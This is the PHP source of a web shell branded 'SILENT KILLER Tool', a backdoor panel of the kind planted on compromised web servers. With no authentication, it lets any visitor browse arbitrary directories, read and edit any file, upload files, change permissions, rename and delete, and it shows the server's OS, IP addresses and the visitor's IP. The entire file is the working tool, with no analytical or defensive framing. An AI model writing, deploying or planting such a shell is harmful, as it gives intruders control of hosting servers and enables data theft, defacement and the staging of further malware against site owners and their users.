<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Get the directory from the URL, defaulting to the current directory
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();

// Fetch system information
$osInfo = php_uname(); // Get the operating system information
$serverIp = $_SERVER['SERVER_ADDR']; // Get the server IP
$clientIp = $_SERVER['REMOTE_ADDR']; // Get the client IP

// Get number of domains hosted on the server IP
$domainsCount = 1034; // Placeholder for demonstration. Replace with actual logic to count domains if necessary

// Get permissions of the current directory
$currentDirPermissions = substr(sprintf('%o', fileperms($currentDir)), -4);

// Output HTML
echo "<!DOCTYPE html><html><head><title>SILENT KILLER Tool</title>
<style>
body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
table { width: 100%; border-collapse: collapse; }
th, td { padding: 8px; text-align: left; border-bottom: 1px solid #333; }
th { background-color: #333; color: #fff; }
td { color: #0ff; }
button, a { background-color: #333; color: #0f0; border: none; padding: 4px 8px; text-decoration: none; cursor: pointer; }
button:hover, a:hover { background-color: #444; }
.file-actions { display: inline-flex; align-items: center; }
.file-actions button { margin-right: 10px; }
a { color: #0ff; }
a:hover { color: #ff0; }

.terminal { background-color: #1e1e1e; padding: 15px; color: #00ff00; font-family: monospace; margin-top: 20px; border-radius: 5px; }
.terminal pre { white-space: pre-wrap; word-wrap: break-word; margin: 0; }
</style>
</head><body>";

echo "<h2>SILENT KILLERPanel</h2>";

// Show breadcrumb navigation (Clickable Path)
$path_parts = explode(DIRECTORY_SEPARATOR, $currentDir);
$breadcrumb = '';
$breadcrumbPath = '';
foreach ($path_parts as $i => $part) {
    $breadcrumbPath .= $part . DIRECTORY_SEPARATOR;
    $breadcrumb .= "<a href='?dir=" . urlencode($breadcrumbPath) . "'>$part</a>";
    if ($i < count($path_parts) - 1) {
        $breadcrumb .= ' > ';
    }
}
echo "<p>Current Path: $breadcrumb</p>";

// Handle file upload
if ($_FILES && isset($_FILES['file'])) {
    // Set the target directory to the current directory
    $targetDir = $currentDir; // Current directory for the upload
    $target = $targetDir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']); // Full path

    // Check if the file is uploaded successfully
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "<p>✅ Uploaded: $target</p>";
    } else {
        echo "<p>❌ Upload failed.</p>";
    }
}

// Upload form
echo <<<HTML
<form method="post" enctype="multipart/form-data">
  <label>Upload File: <input type="file" name="file"></label>
  <button type="submit">Upload</button>
</form>
<hr>
HTML;

// Terminal output section (Simulating Linux CLI output)
echo "<div class='terminal'>
    <pre>Operation   : $osInfo
Software     : Apache
Server IP    : $serverIp | Your IP: $clientIp
Domains      : $domainsCount Domain(s)
Permission   : [ $currentDirPermissions ]</pre>
</div>";

// Check if the current directory is valid and list the files/folders
if (is_dir($currentDir)) {
    $folders = [];
    $files = [];

    // Read the contents of the directory
    $items = scandir($currentDir);
    
    foreach ($items as $item) {
        if ($item != '.' && $item != '..') {
            $itemPath = $currentDir . DIRECTORY_SEPARATOR . $item;
            if (is_dir($itemPath)) {
                $folders[] = $item; // Add directories to the folders array
            } else {
                $files[] = $item; // Add files to the files array
            }
        }
    }

    // Sort both arrays alphabetically
    sort($folders);
    sort($files);

    echo "<h3>Files and Folders in: <a href='?dir=" . urlencode($currentDir) . "'>$currentDir</a></h3>";

    // Display the folders first
    echo "<table><tr><th>Name</th><th>Type</th><th>Size</th><th>Last Modified</th><th>Actions</th></tr>";

    // List directories first
    foreach ($folders as $folder) {
        $folderPath = $currentDir . DIRECTORY_SEPARATOR . $folder;
        echo "<tr>
                <td><a href='?dir=" . urlencode($folderPath) . "'>$folder</a></td>
                <td>Directory</td>
                <td>-</td>
                <td>-</td>
                <td>
                    <form method='get' style='display:inline;'>
                        <button type='submit' name='cmd' value='rename'>Rename</button>
                        <button type='submit' name='cmd' value='delete'>Delete</button>
                        <input type='hidden' name='file' value='$folderPath'>
                        <input type='hidden' name='dir' value='$currentDir'>
                    </form>
                </td>
            </tr>";
    }

    // List files after directories
    foreach ($files as $file) {
        $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
        $size = filesize($filePath);
        $time = date("F d Y H:i:s.", filemtime($filePath));

        // Check if file is a zip file and add Extract option
        $isZip = pathinfo($file, PATHINFO_EXTENSION) === 'zip';
        echo "<tr>
                <td><a href='?cmd=file_read&file=" . urlencode($filePath) . "&dir=" . urlencode($currentDir) . "'>$file</a></td>
                <td>File</td>
                <td>$size bytes</td>
                <td>$time</td>
                <td>
                    <form method='post' style='display:inline;'>
                        <button type='submit' name='cmd' value='file_edit'>&#9998; Edit</button>
                        <button type='submit' name='cmd' value='rename'>Rename</button>
                        <button type='submit' name='cmd' value='chmod'>Chmod</button>
                        <button type='submit' name='cmd' value='delete'>Delete</button>
                        ".($isZip ? "<button type='submit' name='cmd' value='extract'>Extract</button>" : "")."
                        <input type='hidden' name='file' value='$filePath'>
                        <input type='hidden' name='dir' value='$currentDir'>
                    </form>
                </td>
            </tr>";
    }
    echo "</table>";
} else {
    echo "<p>❌ Directory not found.</p>";
}

// Command handler for reading a file (displaying file content)
if (isset($_GET['cmd']) && $_GET['cmd'] == 'file_read' && isset($_GET['file']) && isset($_GET['dir'])) {
    $file = $_GET['file'];
    $currentDir = $_GET['dir'];  // Make sure to retain the current directory
    if (is_file($file)) {
        $fileContent = htmlspecialchars(file_get_contents($file));
        echo "<h3>Reading File: $file</h3>";
        echo "<div style='background: #222; color: #0f0; padding: 10px;'>
                <pre>$fileContent</pre>
              </div>";
    } else {
        echo "<p>❌ File not found.</p>";
    }
}

// Command handler for renaming a file
if (isset($_POST['cmd']) && $_POST['cmd'] == 'rename' && isset($_POST['file'])) {
    $file = $_POST['file'];
    if (isset($_POST['new_name']) && $_POST['new_name'] != '') {
        $new_name = $_POST['new_name'];
        $new_path = dirname($file) . DIRECTORY_SEPARATOR . $new_name;
        if (rename($file, $new_path)) {
            echo "<p>✅ File renamed to $new_name.</p>";
            // Redirect back to the same directory to show updated list
            header("Location: ?dir=" . urlencode(dirname($file)));
            exit;
        } else {
            echo "<p>❌ Rename failed.</p>";
        }
    } else {
        echo "<h3>Rename File: $file</h3>";
        echo "<form method='post'>
                <label>New Name: <input type='text' name='new_name' value='" . basename($file) . "' required></label>
                <button type='submit' name='cmd' value='rename'>Submit</button>
                <input type='hidden' name='file' value='$file'>
                <input type='hidden' name='dir' value='$currentDir'>
              </form>";
    }
}

// Command handler for changing file permissions (chmod)
if (isset($_POST['cmd']) && $_POST['cmd'] == 'chmod' && isset($_POST['file'])) {
    $file = $_POST['file'];
    if (isset($_POST['permissions']) && $_POST['permissions'] != '') {
        $permissions = $_POST['permissions'];
        if (chmod($file, octdec($permissions))) {
            echo "<p>✅ Permissions changed to $permissions.</p>";
            // Redirect back to the same directory to show updated list
            header("Location: ?dir=" . urlencode(dirname($file)));
            exit;
        } else {
            echo "<p>❌ Failed to change permissions.</p>";
        }
    } else {
        $currentPermissions = substr(sprintf('%o', fileperms($file)), -4);
        echo "<h3>Change Permissions for: $file</h3>";
        echo "<form method='post'>
                <label>Permissions (Octal): <input type='text' name='permissions' value='$currentPermissions' required></label>
                <button type='submit' name='cmd' value='chmod'>Submit</button>
                <input type='hidden' name='file' value='$file'>
                <input type='hidden' name='dir' value='$currentDir'>
              </form>";
    }
}

// Command handler for editing a file (displaying file content in textarea for editing)
if (isset($_POST['cmd']) && $_POST['cmd'] == 'file_edit' && isset($_POST['file'])) {
    $file = $_POST['file'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
        $new_content = $_POST['file_content'];
        if (file_put_contents($file, $new_content)) {
            echo "<p>✅ File content updated.</p>";
            // After saving, show the updated content
            $fileContent = htmlspecialchars(file_get_contents($file));
            echo "<h3>Reading File: $file</h3>";
            echo "<div style='background: #222; color: #0f0; padding: 10px;'>
                    <pre>$fileContent</pre>
                  </div>";
        } else {
            echo "<p>❌ Failed to update file.</p>";
        }
    } else {
        $current_content = htmlspecialchars(file_get_contents($file));
        echo "<h3>Edit File: $file</h3>";
        echo "<form method='post'>
                <textarea name='file_content' rows='10' cols='50'>$current_content</textarea><br>
                <button type='submit' name='cmd' value='file_edit'>Save Changes</button>
                <input type='hidden' name='file' value='$file'>
                <input type='hidden' name='dir' value='$currentDir'>
              </form>";
    }
}

// Simple footer
echo "<hr><p><small>SILENT KILLER Tool</small></p></body></html>";
?>
